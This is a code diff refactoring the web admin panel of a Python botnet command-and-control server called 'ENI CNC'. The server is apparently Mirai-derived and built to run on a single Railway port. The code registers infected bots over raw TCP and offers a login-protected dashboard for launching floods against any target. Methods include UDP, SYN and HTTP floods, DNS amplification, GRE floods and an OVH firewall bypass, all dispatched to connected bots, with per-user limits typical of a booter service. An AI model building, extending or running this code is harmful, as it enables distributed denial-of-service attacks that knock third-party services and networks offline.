@@ -3,14 +3,10 @@
 ENI's CNC — Railway-compatible single-port edition.
 
 Protocol auto-detection on $PORT:
-  - HTTP requests    → web admin panel (Flask)
+  - HTTP requests    → web admin panel (manual HTTP handler)
   - raw TCP (ARCH|)  → bot handler
 
 Usage:  python3 cnc_railway.py
-        # Railway sets PORT env var automatically
-        # BOT_PORT is internal-only if you want separate listeners
-
-One Railway service. One port. Full CNC + web admin.
 """
 
 import socket
@@ -18,16 +14,13 @@ import threading
 import time
 import sys
 import os
-import struct
 import hashlib
 import sqlite3
 import random
 import json
-import select
 import re
+import urllib.parse
 from collections import defaultdict
-from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import parse_qs, urlparse
 
 # ——— config ——————————————————————————————————————————————————————
 PORT         = int(os.environ.get('PORT', 8080))
@@ -41,13 +34,11 @@ BUFFER_SIZE  = 4096
 db_dir = os.path.dirname(DB_PATH) or '/data'
 try:
     os.makedirs(db_dir, exist_ok=True)
-    # test write
     testfile = os.path.join(db_dir, '.write_test')
     with open(testfile, 'w') as f:
         f.write('ok')
     os.remove(testfile)
 except (OSError, PermissionError):
-    # volume not writable — fall back to home dir
     DB_PATH = '/home/mirai/mirai.db'
     os.makedirs('/home/mirai', exist_ok=True)
     print(f"[!] /data not writable, falling back to {DB_PATH}")
@@ -106,28 +97,31 @@ bots      = {}
 lock      = threading.Lock()
 running   = True
 attack_slots = {}
+start_time = time.time()
 
 # ——— attack methods —————————————————————————————————————————————————
 METHODS = {
-    'udp':     'UDP flood — high PPS, randomized payload sizes (0-1400 bytes)',
+    'udp':     'UDP flood — high PPS, randomized payload sizes',
     'std':     'STD hex flood — raw TCP hex payload',
-    'tcp':     'TCP SYN flood — syn+ack loop, connection exhaustion',
-    'http':    'HTTP GET flood — randomized paths, user agents, referers',
-    'httphex': 'HTTP + hex payload — hybrid L7 attack',
-    'dns':     'DNS amplification — ANY queries to open resolvers',
+    'tcp':     'TCP SYN flood — connection exhaustion',
+    'http':    'HTTP GET flood — 200 conn pool, randomized UA/paths',
+    'httphex': 'HTTP + hex payload hybrid',
+    'dns':     'DNS amplification — ANY queries via open resolvers',
     'gre':     'GRE protocol flood — encapsulated packets',
-    'stomp':   'TCP stomp — connect+send+disconnect rapid cycle',
-    'vse':     'Valve source engine query flood',
-    'ovh':     'OVH game firewall bypass — mixed UDP patterns',
+    'stomp':   'TCP stomp — connect/send/disconnect rapid cycle',
+    'vse':     'Valve Source Engine query flood',
+    'ovh':     'OVH firewall bypass — mixed patterns, port cycling',
 }
 
-# ——— bot handler (raw TCP) ———————————————————————————————————————————
+# ═══════════════════════════════════════════════════════════════════
+# BOT HANDLER (raw TCP)
+# ═══════════════════════════════════════════════════════════════════
+
 def handle_bot(conn: socket.socket, addr):
     bot_id = None
     try:
         conn.settimeout(BOT_TIMEOUT * 2)
 
-        # read registration
         data = b''
         deadline = time.time() + 10
         while b'\n' not in data and time.time() < deadline:
@@ -189,7 +183,6 @@ def handle_bot(conn: socket.socket, addr):
 
 
 def dispatch_attack(target, port, duration, method, username, max_bots=-1):
-    """Send attack command to all connected bots."""
     with lock:
         available = len(bots)
         if max_bots != -1:
@@ -221,344 +214,351 @@ def dispatch_attack(target, port, duration, method, username, max_bots=-1):
     print(f"[ATK] {username} -> {target}:{port} dur={duration}s method={method} bots={dispatched}")
     return {"ok": True, "attack_id": attack_id, "bots_used": dispatched}
 
-# ——— web admin panel (HTTP) ——————————————————————————————————————————
-HTML_PAGE = r"""
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
+# ═══════════════════════════════════════════════════════════════════
+# AUTH HELPERS
+# ═══════════════════════════════════════════════════════════════════
+
+def check_auth(headers):
+    """Returns username if session cookie is valid, else None."""
+    cookie = headers.get('cookie', '')
+    m = re.search(r'eni_session=([^;]+)', cookie)
+    if m:
+        token = m.group(1)
+        row = db.execute(
+            "SELECT username FROM users WHERE api_key=?",
+            (token,)
+        ).fetchone()
+        if row:
+            return row[0]
+    return None
+
+
+def create_session(username):
+    token = hashlib.sha256(f"{username}:{time.time()}:{random.random()}".encode()).hexdigest()
+    db.execute("UPDATE users SET api_key=? WHERE username=?", (token, username))
+    db.commit()
+    return token
+
+# ═══════════════════════════════════════════════════════════════════
+# HTTP RESPONDER — manual, no framework
+# ═══════════════════════════════════════════════════════════════════
+
+HTTP_200 = "HTTP/1.1 200 OK"
+HTTP_302 = "HTTP/1.1 302 Found"
+HTTP_400 = "HTTP/1.1 400 Bad Request"
+HTTP_404 = "HTTP/1.1 404 Not Found"
+HTTP_500 = "HTTP/1.1 500 Internal Server Error"
+
+
+def http_response(code, content_type="text/html; charset=utf-8", body="", extra_headers=None):
+    """Build a raw HTTP response."""
+    resp = f"{code}\r\n"
+    resp += f"Content-Type: {content_type}\r\n"
+    resp += f"Content-Length: {len(body.encode())}\r\n"
+    resp += "Cache-Control: no-cache\r\n"
+    resp += "Connection: close\r\n"
+    if extra_headers:
+        for k, v in extra_headers.items():
+            resp += f"{k}: {v}\r\n"
+    resp += "\r\n"
+    resp += body
+    return resp.encode()
+
+
+def http_redirect(location, extra_headers=None):
+    headers = {"Location": location}
+    if extra_headers:
+        headers.update(extra_headers)
+    return http_response(HTTP_302, "text/plain", "", headers)
+
+
+# ═══════════════════════════════════════════════════════════════════
+# PAGES
+# ═══════════════════════════════════════════════════════════════════
+
+def build_login_page(error=False):
+    err_div = '<div class="error">bad credentials</div>' if error else ''
+    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
+<title>ENI CNC — Login</title>
+<style>
+  body {{ background:#0a0a0f; color:#c0c0c0; font-family:'Courier New',monospace;
+         display:flex; align-items:center; justify-content:center; min-height:100vh; }}
+  form {{ background:#111118; border:1px solid #222; padding:30px; border-radius:6px; width:320px; }}
+  h1 {{ color:#cc3333; font-size:16px; margin-bottom:20px; text-align:center; }}
+  input {{ width:100%; background:#1a1a22; border:1px solid #333; color:#ccc; padding:10px;
+          font-family:inherit; font-size:13px; border-radius:3px; margin:4px 0; }}
+  button {{ width:100%; background:#cc3333; color:#fff; border:none; padding:10px;
+           font-family:inherit; font-size:14px; font-weight:bold; border-radius:3px;
+           margin-top:12px; cursor:pointer; }}
+  button:hover {{ background:#dd4444; }}
+  .error {{ color:#f88; font-size:12px; text-align:center; margin-top:8px; }}
+</style></head><body>
+<form method="POST" action="/login">
+  <h1>[ ENI CNC ]</h1>
+  {err_div}
+  <input name="username" placeholder="username" autofocus><br>
+  <input name="password" placeholder="password" type="password"><br>
+  <button type="submit">login</button>
+</form></body></html>"""
+
+
+def build_dashboard_page(auth_user, flash_msg=""):
+    with lock:
+        bot_list = sorted(bots.values(), key=lambda b: b['last_seen'], reverse=True)
+        total_bots = len(bot_list)
+        active_attacks = len(attack_slots)
+
+    # uptime
+    uptime_s = int(time.time() - start_time)
+    uptime_str = f"{uptime_s//3600}h {(uptime_s%3600)//60}m {uptime_s%60}s"
+
+    # arch stats
+    arch_count = defaultdict(int)
+    for b in bot_list:
+        arch_count[b['arch']] += 1
+    arch_stats = ' '.join(
+        f'<span class="stat"><b>{c}</b> {a}</span>'
+        for a, c in sorted(arch_count.items(), key=lambda x: -x[1])
+    ) or '<span class="stat">none</span>'
+
+    # bot rows
+    now = time.time()
+    bot_rows = ''
+    for b in bot_list[:100]:
+        age = int(now - b['last_seen'])
+        bid_short = list(bots.keys())[list(bots.values()).index(b)][:12] if b in bot_list else '?'
+        bot_rows += f'<tr><td>{b["ip"]}</td><td>{b["arch"]}</td><td>{age}s</td></tr>\n'
+    if not bot_rows:
+        bot_rows = '<tr><td colspan="3" style="color:#555">(no bots online)</td></tr>'
+
+    # attack rows
+    attack_rows = ''
+    for aid, atk in list(attack_slots.items()):
+        remaining = max(0, atk['duration'] - (time.time() - atk['started']))
+        attack_rows += (
+            f'<div class="attack-row">'
+            f'<span class="id">#{aid}</span> '
+            f'<span class="target">{atk["target"]}:{atk["port"]}</span> '
+            f'— {atk["method"]} — {int(remaining)}s left '
+            f'({atk["bots_used"]} bots) '
+            f'<button class="stop stop-btn" data-id="{aid}">stop</button>'
+            f'</div>\n'
+        )
+    if not attack_rows:
+        attack_rows = '<div style="color:#555">(no attacks running)</div>'
+
+    # method options
+    method_options = '\n'.join(
+        f'<option value="{m}">{m}</option>'
+        for m in METHODS
+    )
+
+    # flash
+    flash_html = ''
+    if flash_msg:
+        flash_html = f'<div class="flash flash-ok">{flash_msg}</div>'
+
+    return f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>ENI CNC</title>
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body { background:#0a0a0f; color:#c0c0c0; font-family:'Courier New',monospace; padding:20px; }
-  .header { border-bottom:1px solid #333; padding-bottom:12px; margin-bottom:20px; }
-  .header h1 { color:#cc3333; font-size:18px; margin-bottom:4px; }
-  .header span { color:#666; font-size:12px; }
-  .grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
-  .card { background:#111118; border:1px solid #222; border-radius:6px; padding:16px; }
-  .card h2 { color:#cc3333; font-size:14px; margin-bottom:12px; border-bottom:1px solid #1a1a22; padding-bottom:8px; }
-  .bots-table { width:100%; font-size:12px; border-collapse:collapse; }
-  .bots-table th { text-align:left; color:#888; padding:4px 8px; border-bottom:1px solid #1a1a22; }
-  .bots-table td { padding:3px 8px; border-bottom:1px solid #111; }
-  .bots-table tr:hover td { background:#1a1a25; }
-  .stat { display:inline-block; background:#1a1a25; padding:4px 10px; margin:2px; border-radius:3px; font-size:12px; }
-  .stat b { color:#cc3333; }
-  form { margin-top:12px; }
-  input, select, button { background:#1a1a22; border:1px solid #333; color:#ccc; padding:8px 12px;
-    font-family:inherit; font-size:13px; border-radius:3px; margin:3px; }
-  button { background:#cc3333; color:#fff; border-color:#cc3333; cursor:pointer; font-weight:bold; }
-  button:hover { background:#dd4444; }
-  button.stop { background:#333; border-color:#444; color:#ccc; }
-  button.stop:hover { background:#555; }
-  .flash { padding:10px 14px; border-radius:4px; margin-bottom:16px; font-size:13px; }
-  .flash-ok { background:#1a3a1a; border:1px solid #2a5a2a; color:#8f8; }
-  .flash-err { background:#3a1a1a; border:1px solid #5a2a2a; color:#f88; }
-  .attack-row { font-size:12px; padding:6px 0; border-bottom:1px solid #111; }
-  .attack-row .id { color:#cc3333; }
-  .attack-row .target { color:#aaa; }
-  @media (max-width:800px) { .grid { grid-template-columns:1fr; } }
-</style>
-</head>
-<body>
+  * {{ margin:0; padding:0; box-sizing:border-box; }}
+  body {{ background:#0a0a0f; color:#c0c0c0; font-family:'Courier New',monospace; padding:20px; }}
+  .header {{ border-bottom:1px solid #333; padding-bottom:12px; margin-bottom:20px; }}
+  .header h1 {{ color:#cc3333; font-size:18px; margin-bottom:4px; }}
+  .header span {{ color:#666; font-size:12px; }}
+  .grid {{ display:grid; grid-template-columns:1fr 1fr; gap:20px; }}
+  .card {{ background:#111118; border:1px solid #222; border-radius:6px; padding:16px; }}
+  .card h2 {{ color:#cc3333; font-size:14px; margin-bottom:12px; border-bottom:1px solid #1a1a22; padding-bottom:8px; }}
+  .bots-table {{ width:100%; font-size:12px; border-collapse:collapse; }}
+  .bots-table th {{ text-align:left; color:#888; padding:4px 8px; border-bottom:1px solid #1a1a22; }}
+  .bots-table td {{ padding:3px 8px; border-bottom:1px solid #111; }}
+  .bots-table tr:hover td {{ background:#1a1a25; }}
+  .stat {{ display:inline-block; background:#1a1a25; padding:4px 10px; margin:2px; border-radius:3px; font-size:12px; }}
+  .stat b {{ color:#cc3333; }}
+  form {{ margin-top:12px; }}
+  input, select, button {{ background:#1a1a22; border:1px solid #333; color:#ccc; padding:8px 12px;
+    font-family:inherit; font-size:13px; border-radius:3px; margin:3px; }}
+  button {{ background:#cc3333; color:#fff; border-color:#cc3333; cursor:pointer; font-weight:bold; }}
+  button:hover {{ background:#dd4444; }}
+  button.stop {{ background:#333; border-color:#444; color:#ccc; }}
+  button.stop:hover {{ background:#555; }}
+  .flash {{ padding:10px 14px; border-radius:4px; margin-bottom:16px; font-size:13px; }}
+  .flash-ok {{ background:#1a3a1a; border:1px solid #2a5a2a; color:#8f8; }}
+  .flash-err {{ background:#3a1a1a; border:1px solid #5a2a2a; color:#f88; }}
+  .attack-row {{ font-size:12px; padding:6px 0; border-bottom:1px solid #111; }}
+  .attack-row .id {{ color:#cc3333; }}
+  .attack-row .target {{ color:#aaa; }}
+  @media (max-width:800px) {{ .grid {{ grid-template-columns:1fr; }} }}
+</style></head><body>
 <div class="header">
   <h1>[ ENI CNC ]</h1>
-  <span>{{STATS.bots}} bots online · {{STATS.attacks}} attacks running · uptime {{STATS.uptime}}</span>
+  <span>{total_bots} bots online · {active_attacks} attacks running · uptime {uptime_str}</span>
 </div>
-
-{{FLASH}}
-
+{flash_html}
 <div class="grid">
   <div class="card">
-    <h2>⚔ launch attack</h2>
+    <h2>attack</h2>
     <form method="POST" action="/attack">
       <input name="target" placeholder="target IP/hostname" required style="width:100%"><br>
       <input name="port" placeholder="port" value="80" type="number" min="1" max="65535" style="width:30%">
       <input name="duration" placeholder="seconds" value="60" type="number" min="1" max="86400" style="width:30%">
-      <select name="method" style="width:30%">
-        {{METHOD_OPTIONS}}
-      </select><br>
+      <select name="method" style="width:30%">{method_options}</select><br>
       <button type="submit">.attack</button>
     </form>
   </div>
-
   <div class="card">
-    <h2>📊 overview</h2>
-    {{ARCH_STATS}}
+    <h2>overview</h2>
+    {arch_stats}
   </div>
-
   <div class="card" style="grid-column:1/-1;">
-    <h2>🤖 online bots ({{BOT_COUNT}})</h2>
+    <h2>online bots ({total_bots})</h2>
     <table class="bots-table">
-      <tr><th>IP</th><th>ARCH</th><th>AGE</th><th>ID</th></tr>
-      {{BOT_ROWS}}
+      <tr><th>IP</th><th>ARCH</th><th>AGE</th></tr>
+      {bot_rows}
     </table>
   </div>
-
   <div class="card" style="grid-column:1/-1;">
-    <h2>⚡ active attacks</h2>
-    {{ATTACK_ROWS}}
+    <h2>active attacks</h2>
+    {attack_rows}
   </div>
 </div>
-
 <script>
-  // auto-refresh every 5 seconds
   setTimeout(() => location.reload(), 5000);
-
-  // stop attack buttons
-  document.querySelectorAll('.stop-btn').forEach(btn => {
-    btn.addEventListener('click', async (e) => {
+  document.querySelectorAll('.stop-btn').forEach(btn => {{
+    btn.addEventListener('click', async (e) => {{
       e.preventDefault();
-      const id = btn.dataset.id;
-      await fetch('/stop/' + id, {method:'POST'});
+      await fetch('/stop/' + btn.dataset.id, {{method:'POST'}});
       location.reload();
-    });
-  });
+    }});
+  }});
 </script>
-</body>
-</html>
-"""
+</body></html>"""
 
+# ═══════════════════════════════════════════════════════════════════
+# HTTP REQUEST PARSER
+# ═══════════════════════════════════════════════════════════════════
 
-class CNCWebHandler(BaseHTTPRequestHandler):
-    """HTTP admin panel + bot relay."""
+def parse_http_request(data: bytes):
+    """Parse raw HTTP request into (method, path, headers, body)."""
+    try:
+        header_end = data.find(b'\r\n\r\n')
+        if header_end == -1:
+            return None
 
-    def log_message(self, format, *args):
-        pass  # quiet
+        header_section = data[:header_end].decode('utf-8', errors='ignore')
+        body = data[header_end + 4:]
 
-    def do_GET(self):
-        path = urlparse(self.path).path
+        lines = header_section.split('\r\n')
+        request_line = lines[0].split()
 
-        if path == '/' or path == '/index.html':
-            self.serve_dashboard()
-        elif path == '/api/bots':
-            self.serve_json(self.api_bots())
-        elif path == '/api/attacks':
-            self.serve_json(self.api_attacks())
-        elif path == '/api/stats':
-            self.serve_json(self.api_stats())
-        else:
-            self.send_error(404)
+        if len(request_line) < 2:
+            return None
 
-    def do_POST(self):
-        path = urlparse(self.path).path
+        method = request_line[0].upper()
+        path = request_line[1]
 
-        if path == '/attack':
-            self.handle_attack_form()
-        elif path.startswith('/stop/'):
-            attack_id = int(path.split('/')[-1])
-            self.handle_stop(attack_id)
-        elif path == '/login':
-            self.handle_login()
-        else:
-            self.send_error(404)
+        headers = {}
+        for line in lines[1:]:
+            if ':' in line:
+                k, v = line.split(':', 1)
+                headers[k.strip().lower()] = v.strip()
 
-    def serve_html(self, html):
-        self.send_response(200)
-        self.send_header('Content-Type', 'text/html; charset=utf-8')
-        self.send_header('Cache-Control', 'no-cache')
-        self.end_headers()
-        self.wfile.write(html.encode())
+        # read remaining body if Content-Length specified
+        cl = int(headers.get('content-length', 0))
+        while len(body) < cl:
+            # body already fully read above in multiplexer; this is safety
+            break
 
-    def serve_json(self, data):
-        self.send_response(200)
-        self.send_header('Content-Type', 'application/json')
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.end_headers()
-        self.wfile.write(json.dumps(data).encode())
+        return (method, path, headers, body)
 
-    # ——— auth (simple cookie-based) ———————————————————————————————
-    def check_auth(self):
-        """Returns username if authenticated, None otherwise."""
-        cookie = self.headers.get('Cookie', '')
-        m = re.search(r'eni_session=([^;]+)', cookie)
-        if m:
-            token = m.group(1)
-            row = db.execute(
-                "SELECT username FROM users WHERE api_key=?",
-                (token,)
-            ).fetchone()
-            if row:
-                return row[0]
+    except Exception:
         return None
 
-    def require_auth(self):
-        """Check auth. Returns username or redirects to login."""
-        user = self.check_auth()
+
+def parse_form_body(body: bytes) -> dict:
+    """Parse URL-encoded form body into dict."""
+    try:
+        text = body.decode('utf-8', errors='ignore')
+        return {k: v[0] if len(v) == 1 else v
+                for k, v in urllib.parse.parse_qs(text).items()}
+    except:
+        return {}
+
+# ═══════════════════════════════════════════════════════════════════
+# HTTP ROUTER
+# ═══════════════════════════════════════════════════════════════════
+
+def route_http(method, path, headers, body):
+    """Route an HTTP request and return raw response bytes."""
+
+    # ——— static: favicon ———
+    if path == '/favicon.ico':
+        return http_response(HTTP_404, "text/plain", "not found")
+
+    # ——— GET: login page ———
+    if method == 'GET' and (path == '/' or path == '/login' or path == '/index.html'):
+        user = check_auth(headers)
         if user:
-            return user
+            return build_dashboard_page(user).encode()
+        else:
+            error = 'error' in path or 'error=1' in path
+            return build_login_page(error).encode()
 
-        # show login page
-        login_html = """<!DOCTYPE html><html><head><meta charset="UTF-8">
-        <title>ENI CNC — Login</title>
-        <style>
-          body { background:#0a0a0f; color:#c0c0c0; font-family:'Courier New',monospace;
-                 display:flex; align-items:center; justify-content:center; min-height:100vh; }
-          form { background:#111118; border:1px solid #222; padding:30px; border-radius:6px; width:320px; }
-          h1 { color:#cc3333; font-size:16px; margin-bottom:20px; text-align:center; }
-          input { width:100%; background:#1a1a22; border:1px solid #333; color:#ccc; padding:10px;
-                  font-family:inherit; font-size:13px; border-radius:3px; margin:4px 0; }
-          button { width:100%; background:#cc3333; color:#fff; border:none; padding:10px;
-                   font-family:inherit; font-size:14px; font-weight:bold; border-radius:3px;
-                   margin-top:12px; cursor:pointer; }
-          button:hover { background:#dd4444; }
-          .error { color:#f88; font-size:12px; text-align:center; margin-top:8px; }
-        </style></head><body>
-        <form method="POST" action="/login">
-          <h1>[ ENI CNC ]</h1>
-          """ + ('<div class="error">bad credentials</div>' if self.path != '/' else '') + """
-          <input name="username" placeholder="username" autofocus><br>
-          <input name="password" placeholder="password" type="password"><br>
-          <button type="submit">login</button>
-        </form></body></html>"""
-        self.serve_html(login_html)
-        return None
+    # ——— POST: login ———
+    if method == 'POST' and path == '/login':
+        params = parse_form_body(body)
+        username = params.get('username', '')
+        password = params.get('password', '')
+        pw_hash = hashlib.sha256(password.encode()).hexdigest()
 
-    # ——— dashboard —————————————————————————————————————————————————
-    def serve_dashboard(self):
-        user = self.require_auth()
+        row = db.execute("SELECT id, username FROM users WHERE username=? AND password=?",
+                         (username, pw_hash)).fetchone()
+        if row:
+            token = create_session(username)
+            return http_redirect('/', {'Set-Cookie': f'eni_session={token}; Path=/; HttpOnly; Max-Age=86400'})
+        else:
+            return http_redirect('/?error=1')
+
+    # ——— POST: attack ———
+    if method == 'POST' and path == '/attack':
+        user = check_auth(headers)
         if not user:
-            return
+            return http_redirect('/?error=1')
 
-        with lock:
-            bot_list = sorted(bots.values(), key=lambda b: b['last_seen'], reverse=True)
+        params = parse_form_body(body)
+        target   = params.get('target', '')
+        port     = int(params.get('port', '80'))
+        duration = int(params.get('duration', '60'))
+        method_name = params.get('method', 'udp')
 
-        # build method options
-        method_options = '\n'.join(
-            f'<option value="{m}">{m} — {desc[:50]}...</option>'
-            for m, desc in METHODS.items()
-        )
-
-        # build arch stats
-        arch_count = defaultdict(int)
-        for b in bot_list:
-            arch_count[b['arch']] += 1
-        arch_stats = ' '.join(
-            f'<span class="stat"><b>{c}</b> {a}</span>'
-            for a, c in sorted(arch_count.items(), key=lambda x: -x[1])
-        ) or '<span class="stat">none</span>'
-
-        # build bot rows
-        now = time.time()
-        bot_rows = ''
-        for b in bot_list[:100]:  # show first 100
-            age = int(now - b['last_seen'])
-            bot_rows += f'<tr><td>{b["ip"]}</td><td>{b["arch"]}</td><td>{age}s</td><td style="color:#555;font-size:10px">{b.get("id","?")[:12]}</td></tr>\n'
-        if not bot_rows:
-            bot_rows = '<tr><td colspan="4" style="color:#555">(no bots online)</td></tr>'
-
-        # attack rows
-        attack_rows = ''
-        for aid, atk in list(attack_slots.items()):
-            remaining = max(0, atk['duration'] - (time.time() - atk['started']))
-            attack_rows += (
-                f'<div class="attack-row">'
-                f'<span class="id">#{aid}</span> '
-                f'<span class="target">{atk["target"]}:{atk["port"]}</span> '
-                f'— {atk["method"]} — {int(remaining)}s left '
-                f'({atk["bots_used"]} bots) '
-                f'<button class="stop stop-btn" data-id="{aid}" style="font-size:10px;padding:2px 8px;">stop</button>'
-                f'</div>\n'
-            )
-        if not attack_rows:
-            attack_rows = '<div style="color:#555">(no attacks running)</div>'
-
-        # uptime
-        uptime_s = int(time.time() - start_time)
-        uptime_str = f"{uptime_s//3600}h {(uptime_s%3600)//60}m {uptime_s%60}s"
-
-        html = HTML_PAGE
-        html = html.replace('{{STATS.bots}}', str(len(bot_list)))
-        html = html.replace('{{STATS.attacks}}', str(len(attack_slots)))
-        html = html.replace('{{STATS.uptime}}', uptime_str)
-        html = html.replace('{{FLASH}}', '')
-        html = html.replace('{{METHOD_OPTIONS}}', method_options)
-        html = html.replace('{{ARCH_STATS}}', arch_stats)
-        html = html.replace('{{BOT_COUNT}}', str(len(bot_list)))
-        html = html.replace('{{BOT_ROWS}}', bot_rows)
-        html = html.replace('{{ATTACK_ROWS}}', attack_rows)
-
-        self.serve_html(html)
-
-    # ——— API endpoints ————————————————————————————————————————————
-    def api_bots(self):
-        with lock:
-            return {
-                'count': len(bots),
-                'bots': [
-                    {'ip': b['ip'], 'arch': b['arch'], 'age': int(time.time() - b['last_seen'])}
-                    for b in sorted(bots.values(), key=lambda x: x['last_seen'], reverse=True)
-                ]
-            }
-
-    def api_attacks(self):
-        return {
-            'count': len(attack_slots),
-            'attacks': [
-                {
-                    'id': aid, 'target': a['target'], 'port': a['port'],
-                    'duration': a['duration'], 'method': a['method'],
-                    'remaining': max(0, a['duration'] - (time.time() - a['started'])),
-                    'bots_used': a['bots_used'],
-                }
-                for aid, a in attack_slots.items()
-            ]
-        }
-
-    def api_stats(self):
-        with lock:
-            arch_count = defaultdict(int)
-            for b in bots.values():
-                arch_count[b['arch']] += 1
-        return {
-            'total_bots': len(bots),
-            'active_attacks': len(attack_slots),
-            'uptime': int(time.time() - start_time),
-            'architectures': dict(arch_count),
-        }
-
-    # ——— attack form handler —————————————————————————————————————
-    def handle_attack_form(self):
-        user = self.require_auth()
-        if not user:
-            return
-
-        length = int(self.headers.get('Content-Length', 0))
-        body = self.rfile.read(length).decode()
-        params = parse_qs(body)
-
-        target   = params.get('target', [''])[0]
-        port     = int(params.get('port', ['80'])[0])
-        duration = int(params.get('duration', ['60'])[0])
-        method   = params.get('method', ['udp'])[0]
-
-        # get user limits
         row = db.execute("SELECT duration, max_bots FROM users WHERE username=?",
                          (user,)).fetchone()
         max_dur = row[0] if row else 3600
         max_bots = row[1] if row else -1
-
         duration = min(duration, max_dur)
 
-        if method not in METHODS:
-            self.send_error(400, "unknown method")
-            return
+        if method_name not in METHODS:
+            return http_response(HTTP_400, "text/plain", "unknown method")
 
-        result = dispatch_attack(target, port, duration, method, user, max_bots)
+        result = dispatch_attack(target, port, duration, method_name, user, max_bots)
 
         db.execute("INSERT INTO history (username, command, time) VALUES (?, ?, ?)",
-                   (user, f".attack {target} {port} {duration} {method}", int(time.time())))
+                   (user, f".attack {target} {port} {duration} {method_name}", int(time.time())))
         db.commit()
 
-        # redirect back to dashboard with result
-        self.send_response(302)
-        self.send_header('Location', '/')
-        self.end_headers()
+        return http_redirect('/')
 
-    def handle_stop(self, attack_id):
-        user = self.require_auth()
+    # ——— POST: stop attack ———
+    if method == 'POST' and path.startswith('/stop/'):
+        user = check_auth(headers)
         if not user:
-            return
+            return http_response("HTTP/1.1 401 Unauthorized", "application/json", '{"error":"unauthorized"}')
+
+        try:
+            attack_id = int(path.split('/')[-1])
+        except ValueError:
+            return http_response(HTTP_400, "application/json", '{"error":"bad id"}')
 
         if attack_id in attack_slots:
             with lock:
@@ -569,68 +569,131 @@ class CNCWebHandler(BaseHTTPRequestHandler):
                         bots.pop(bid, None)
             del attack_slots[attack_id]
 
-        self.send_response(200)
-        self.send_header('Content-Type', 'application/json')
-        self.end_headers()
-        self.wfile.write(json.dumps({"ok": True}).encode())
+        return http_response(HTTP_200, "application/json", '{"ok":true}')
 
-    def handle_login(self):
-        length = int(self.headers.get('Content-Length', 0))
-        body = self.rfile.read(length).decode()
-        params = parse_qs(body)
-        username = params.get('username', [''])[0]
-        password = params.get('password', [''])[0]
-        pw_hash = hashlib.sha256(password.encode()).hexdigest()
+    # ——— GET: API endpoints ———
+    if method == 'GET':
+        if path == '/api/stats':
+            with lock:
+                arch_count = defaultdict(int)
+                for b in bots.values():
+                    arch_count[b['arch']] += 1
+            data = {
+                'total_bots': len(bots),
+                'active_attacks': len(attack_slots),
+                'uptime': int(time.time() - start_time),
+                'architectures': dict(arch_count),
+            }
+            return http_response(HTTP_200, "application/json", json.dumps(data))
 
-        row = db.execute("SELECT id, username FROM users WHERE username=? AND password=?",
-                         (username, pw_hash)).fetchone()
+        if path == '/api/bots':
+            with lock:
+                data = {
+                    'count': len(bots),
+                    'bots': [
+                        {'ip': b['ip'], 'arch': b['arch'],
+                         'age': int(time.time() - b['last_seen'])}
+                        for b in sorted(bots.values(), key=lambda x: x['last_seen'], reverse=True)
+                    ]
+                }
+            return http_response(HTTP_200, "application/json", json.dumps(data))
 
-        if row:
-            # generate session token
-            token = hashlib.sha256(f"{username}:{time.time()}:{random.random()}".encode()).hexdigest()
-            db.execute("UPDATE users SET api_key=? WHERE username=?", (token, username))
-            db.commit()
+        if path == '/api/attacks':
+            data = {
+                'count': len(attack_slots),
+                'attacks': [
+                    {
+                        'id': aid, 'target': a['target'], 'port': a['port'],
+                        'duration': a['duration'], 'method': a['method'],
+                        'remaining': max(0, a['duration'] - (time.time() - a['started'])),
+                        'bots_used': a['bots_used'],
+                    }
+                    for aid, a in attack_slots.items()
+                ]
+            }
+            return http_response(HTTP_200, "application/json", json.dumps(data))
 
-            self.send_response(302)
-            self.send_header('Set-Cookie', f'eni_session={token}; Path=/; HttpOnly; Max-Age=86400')
-            self.send_header('Location', '/')
-            self.end_headers()
-        else:
-            # login failed — show form again
-            self.send_response(302)
-            self.send_header('Location', '/?error=1')
-            self.end_headers()
+    # ——— 404 ———
+    return http_response(HTTP_404, "text/plain", "not found")
 
-# ——— protocol detector ————————————————————————————————————————————————
+# ═══════════════════════════════════════════════════════════════════
+# HTTP HANDLER (per connection)
+# ═══════════════════════════════════════════════════════════════════
+
+def handle_http(conn: socket.socket, addr):
+    """Read full HTTP request from socket, route, send response."""
+    try:
+        conn.settimeout(30)
+
+        # read request
+        data = b''
+        while True:
+            try:
+                chunk = conn.recv(8192)
+                if not chunk:
+                    break
+                data += chunk
+                # stop reading when we have full headers + body
+                header_end = data.find(b'\r\n\r\n')
+                if header_end != -1:
+                    # check Content-Length
+                    headers_str = data[:header_end].decode('utf-8', errors='ignore')
+                    cl_match = re.search(r'Content-Length:\s*(\d+)', headers_str, re.IGNORECASE)
+                    if cl_match:
+                        needed = header_end + 4 + int(cl_match.group(1))
+                        if len(data) >= needed:
+                            break
+                    else:
+                        break  # no body
+            except socket.timeout:
+                break
+
+        if not data:
+            conn.close()
+            return
+
+        parsed = parse_http_request(data)
+        if parsed is None:
+            conn.send(http_response(HTTP_400, "text/plain", "bad request"))
+            conn.close()
+            return
+
+        method, path, headers, body = parsed
+        response_bytes = route_http(method, path, headers, body)
+        conn.send(response_bytes)
+
+    except Exception:
+        pass
+    finally:
+        try: conn.close()
+        except: pass
+
+# ═══════════════════════════════════════════════════════════════════
+# PROTOCOL DETECTOR
+# ═══════════════════════════════════════════════════════════════════
+
 def detect_protocol(first_bytes: bytes) -> str:
-    """
-    Peek at the first bytes to determine protocol.
-    Returns 'http' or 'bot'.
-    """
+    """Peek at first bytes to determine HTTP vs bot."""
     text = first_bytes.decode('utf-8', errors='ignore')
 
-    # HTTP methods
     if text.startswith(('GET ', 'POST ', 'HEAD ', 'PUT ', 'DELETE ', 'OPTIONS ', 'PATCH ')):
         return 'http'
 
-    # Bot registration: ARCH|IP\n
-    # Valid archs: arm, mips, mipsel, sh4, i586, i686, x86_64, sparc, ppc, m68k
     if re.match(r'^[a-zA-Z0-9_]+\|', text):
         return 'bot'
 
-    # HTTP/1.x or HTTP/2 in binary
     if b'HTTP/' in first_bytes:
         return 'http'
 
-    # Default to HTTP for browser connections
+    # default: HTTP for browser connections
     if len(first_bytes) > 0 and first_bytes[0:1] in (b'G', b'P', b'H', b'O', b'D', b'C'):
         return 'http'
 
     return 'bot'
 
-
